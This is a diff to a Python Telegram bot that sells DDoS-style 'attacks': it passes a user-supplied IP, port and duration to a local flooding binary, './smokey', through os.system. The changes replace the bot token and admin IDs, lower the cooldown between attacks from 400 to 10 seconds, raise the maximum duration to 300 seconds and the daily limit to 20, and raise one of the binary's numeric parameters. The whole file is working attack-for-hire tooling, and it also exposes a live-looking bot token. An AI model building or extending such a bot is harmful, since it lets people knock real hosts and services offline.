@@ -8,8 +8,8 @@ from telegram import Update, InputMediaPhoto, InlineKeyboardButton, InlineKeyboa
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
 
 # Updated credentials
-TOKEN = "6838193855:AAFl6-Mke4I5uXP5IpRH659VRUGa_VJTQIA"
-ADMIN_IDS = ["1786683163", "6512242172"]
+TOKEN = "7567122521:AAHW9UVPP7dX2psWOSxd2EPJ6qzkD56--mY"
+ADMIN_IDS = ["1852711786", "6512242172"]
 GROUP_ID = "-1002421909799"
 
 USER_FILE = "users.txt"
@@ -23,9 +23,9 @@ user_cooldowns = {}
 attack_limits = {}
 
 MAX_CONCURRENT_ATTACKS = 2
-ATTACK_COOLDOWN = 400
-MAX_ATTACK_DURATION = 180
-DEFAULT_DAILY_LIMIT = 10
+ATTACK_COOLDOWN = 10
+MAX_ATTACK_DURATION = 300
+DEFAULT_DAILY_LIMIT = 20
 
 ATTACK_IMAGES = [
     "https://files.catbox.moe/abc123.jpg",
@@ -157,7 +157,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>🚀 ʙᴏᴛ ɪs ᴏɴʟɪɴᴇ ᴀɴᴅ ʀᴇᴀᴅʏ!</b>
 
 👑 <b>ᴏᴡɴᴇʀ:</b> @offx_sahil
-📣 <b>ᴄʜᴀɴɴᴇʟ:</b> @kasukabe0
+📣 <b>ᴄʜᴀɴɴᴇʟ:</b> @kasukabe_personal0
 
 ᴜsᴇ /help ᴛᴏ sᴇᴇ ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs.
 """
@@ -280,7 +280,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not duration.isdigit() or int(duration) > MAX_ATTACK_DURATION:
         return await context.bot.send_message(
             chat_id=chat_id,
-            text="⚕️ <b>Max time: 180 seconds.</b>",
+            text="⚕️ <b>Max time: 300 seconds.</b>",
             parse_mode="HTML"
         )
 
@@ -331,7 +331,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def execute_attack(ip, port, duration, attack_id, chat_id, context, user_name):
     active_attacks.append(attack_id)
-    os.system(f"./smokey {ip} {port} {duration} 1024 1200")
+    os.system(f"./smokey {ip} {port} {duration} 1024 1800")
     asyncio.run(send_attack_finished_message(chat_id, ip, port, context, user_name))
     if attack_id in active_attacks:
         active_attacks.remove(attack_id)
